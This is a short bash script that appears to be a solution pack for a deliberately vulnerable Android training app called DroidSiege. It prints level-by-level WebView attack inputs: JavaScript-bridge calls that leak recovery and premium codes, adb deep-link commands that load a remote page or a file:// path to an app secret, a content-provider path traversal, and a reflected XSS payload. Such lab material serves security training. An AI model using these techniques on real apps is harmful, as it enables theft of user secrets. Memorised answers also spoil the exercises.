#!/usr/bin/env bash
# DroidSiege — webview family tooling pack
set -euo pipefail

echo "== jsbridge L1/L2: injected JS (the console runs it for you) =="
echo "  SiegeBridge.reportResult(SiegeBridge.getRecoveryCode())"
echo "  var t = document.getElementById('token').value; SiegeBridge.reportResult(SiegeBridge.getPremiumCode(t))"

echo
echo "== jsbridge L3: chain via the phase-3 deep link =="
echo "adb shell am start -a android.intent.action.VIEW -d 'offers://load?url=https://offers.siegeapp.dev/bridge'"

echo
echo "== fileaccess L1/L4: file:// payload =="
echo "adb shell am start -a android.intent.action.VIEW -d 'offers://load?url=file:///data/data/com.droidsiege/files/wv_secret.txt'"

echo
echo "== fileaccess L3: provider traversal through the WebView =="
echo "content://com.droidsiege.vault/files/notes/../../wv/wv_provider_escrow.txt"

echo
echo "== xss L1: reflected payload =="
echo "  <script>SiegeBridge.reportResult(document.getElementById('secret').textContent)</script>"
